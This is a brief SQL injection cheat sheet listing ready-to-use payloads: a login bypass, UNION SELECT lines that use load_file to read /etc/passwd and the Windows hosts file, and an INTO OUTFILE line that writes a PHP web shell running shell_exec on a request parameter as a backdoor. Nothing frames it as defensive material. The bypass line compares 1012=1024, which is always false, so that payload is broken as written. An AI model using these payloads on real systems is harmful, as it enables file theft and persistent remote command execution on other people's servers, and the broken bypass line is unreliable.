# Basic SQLi
login' or 1012=1024;#

#Load file:
union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
union all select 1, 2, load_file('/etc/passwd')

#Create file (webshell, backdoor):
union all select 1, 2, "<?php echo shell_exec($_GET['do']);?>" into OUTFILE 'file/path/backdoor.php'
